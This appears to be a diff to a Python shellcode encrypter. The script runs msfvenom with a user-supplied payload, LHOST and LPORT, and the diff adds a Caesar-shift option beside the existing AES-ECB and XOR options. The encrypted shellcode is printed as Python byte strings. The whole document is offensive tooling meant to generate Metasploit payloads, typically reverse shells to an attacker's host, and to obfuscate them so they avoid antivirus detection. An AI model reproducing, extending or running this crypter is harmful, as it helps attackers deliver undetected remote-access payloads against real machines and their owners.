@@ -4,12 +4,25 @@ import argparse
 from Crypto.Cipher import AES
 from Crypto.Util import Padding
 
+
+def caesar_encrypt(shellcode, key):
+    """Caesar Cipher encryption method"""
+    key = int(key)
+    encrypted_shellcode = bytearray()
+    for b in shellcode:
+        encrypted_b = (b + key) % 256
+        #encrypted_b = b + key
+        encrypted_shellcode.append(encrypted_b)
+    print("Caesar Cipher enc for py shellcode")
+    print("\r\nShellcode size: "+ str(len(encrypted_shellcode))+ "\r\n")
+    return encrypted_shellcode
+
+
 def aes_encrypt(shellcode, key):
-    """Encrypts the data using the AES encryption method"""
+    """AES encryption method"""
     key = key.encode()
     # Pad the key to the correct length
     key = key.ljust(16, b'\x00')
-    #just to be sure it will be extra padded :), maybe I should implement pad removal if key is too long???
     while len(key) < 16:
         key += b'\x00'
     cipher = AES.new(key, AES.MODE_ECB)
@@ -19,8 +32,9 @@ def aes_encrypt(shellcode, key):
     print("\r\nShellcode size: "+ str(len(encrypted_shellcode))+ "\r\n")
     return encrypted_shellcode
 
+
 def xor_encrypt(shellcode, key):
-    """Encrypts the shellcode w XOR encryption method"""
+    """XOR encryption method"""
     key = key.encode()
     encrypted_shellcode = bytearray()
     for i, c in enumerate(shellcode):
@@ -47,15 +61,29 @@ def main():
     msfvenom_output = subprocess.run(['msfvenom', '-p', args.payload, '-f', 'python','-v','shellcode', '-a', 'x86', 'LHOST='+args.lhost, 'LPORT='+args.lport], capture_output=True)
     shellcode = msfvenom_output.stdout.decode().strip(" ")
 
-    lines = [shellcode[i:i+60] for i in range(0, len(shellcode), 60)]
-    
-    if args.encryption == 'aes' and args.key:
+    if args.encryption != None:
         shellcode += "\""
         shellcode = shellcode.replace("\" +\n\"", "")
         shellcode = shellcode.replace("shellcode =  b\"", "")
         shellcode = shellcode.replace("\"\n\"","")
         shellcode = shellcode.replace("\"\nshellcode += b\"", "")
         shellcode = shellcode.replace("\\x","")
+
+
+    if args.encryption == 'rot' and args.key:
+        shellcode = bytearray.fromhex(shellcode)
+        encrypted_shellcode = caesar_encrypt(shellcode, args.key)
+        print("EncShellcode = b", end="")
+        print("\"", end="")
+        for i, b in enumerate(encrypted_shellcode):
+            print("\\x%02x" % b, end="")
+            if (i+1) % 15 == 0:
+                print("\"")
+                print("EncShellcode += b\"", end="")
+        print("\"")
+
+
+    if args.encryption == 'aes' and args.key:
         shellcode = bytearray.fromhex(shellcode)
         encrypted_shellcode = aes_encrypt(shellcode, args.key)
         #print(shellcode)
@@ -67,14 +95,9 @@ def main():
                 print("\"")
                 print("EncShellcode += b\"", end="")
         print("\"")
-    
+
+
     if args.encryption == 'xor':
-        shellcode += "\""
-        shellcode = shellcode.replace("\" +\n\"", "")
-        shellcode = shellcode.replace("shellcode =  b\"", "")
-        shellcode = shellcode.replace("\"\n\"","")
-        shellcode = shellcode.replace("\"\nshellcode += b\"", "")
-        shellcode = shellcode.replace("\\x","")
         shellcode = bytearray(shellcode.encode())
         encrypted_shellcode = xor_encrypt(shellcode, args.key)
         #print(shellcode)
@@ -86,7 +109,8 @@ def main():
                 print("\"")
                 print("EncShellcode += b\"", end="")
         print("\"")
-        
+
+
     if args.encryption == None:
         if isinstance(shellcode, bytes):
             shellcode = shellcode.replace(b'shelcode =',b'OShellcode = ')
@@ -94,6 +118,6 @@ def main():
             shellcode = shellcode.replace('shelcode =','OShellcode = ')
             print(shellcode)
 
-            
 if __name__ == '__main__':
     main()
+
